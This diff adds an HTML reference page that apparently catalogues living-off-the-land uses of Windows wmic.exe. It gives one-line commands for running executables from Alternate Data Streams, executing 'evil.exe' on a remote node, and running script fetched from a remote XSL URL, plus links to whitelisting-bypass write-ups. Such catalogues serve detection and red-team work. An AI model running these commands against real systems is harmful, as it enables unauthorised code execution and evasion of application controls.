@@ -1,0 +1,58 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Wmic</title>
+</head><body>Execute calc.exe.<br/>
+wmic.exe process call create calc<br/>
+<br/>
+<br/>
+Execute a .EXE file stored as an Alternate Data Stream (ADS).<br/>
+wmic.exe process call create "c:\ads\file.txt:program.exe" <br/>
+<br/>
+<br/>
+Execute evil.exe on the remote system.<br/>
+wmic.exe /node:"192.168.0.1" process call create "evil.exe"<br/>
+<br/>
+<br/>
+Execute a script contained in the target .XSL file hosted on a remote server.<br/>
+wmic.exe process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"<br/>
+<br/>
+<br/>
+Executes JScript or VBScript embedded in the target XSL stylesheet.<br/>
+wmic.exe os get /format:"MYXSLFILE.xsl"<br/>
+<br/>
+<br/>
+Executes JScript or VBScript embedded in the target remote XSL stylsheet.<br/>
+wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"<br/>
+<br/>
+<br/>
+<ul>Windows binary: True</ul>
+<ul>Bypasses Default AppLocker Rules: False</ul>
+<ul>Mitre:</ul>
+<ul><li>Links:</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li><a href="https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory">https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory</a></li>
+<li><a href="https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html">https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html</a></li>
+<li><a href="https://twitter.com/subTee/status/986234811944648707">https://twitter.com/subTee/status/986234811944648707</a></li>
+</ul>
+</li>
+</ul>
+<ul><li>File path:</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li>c:\windows\system32\wbem\wmic.exe</li>
+<li>c:\windows\sysWOW64\wbem\wmic.exe</li>
+</ul>
+</li>
+</ul>
+<ul><li>Acknowledgement:</li>
+</ul>
+<ul><li style="list-style-type: none"><ul><li>Name: Casey Smith</li>
+<li style="list-style-type: none"><ul><li>Twitter: <a href="https://twitter.com/@subtee">@subtee</a></li>
+<li>Blog: <a href="https://subt0x11.blogspot.com/">https://subt0x11.blogspot.com</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+&nbsp;</body></html>
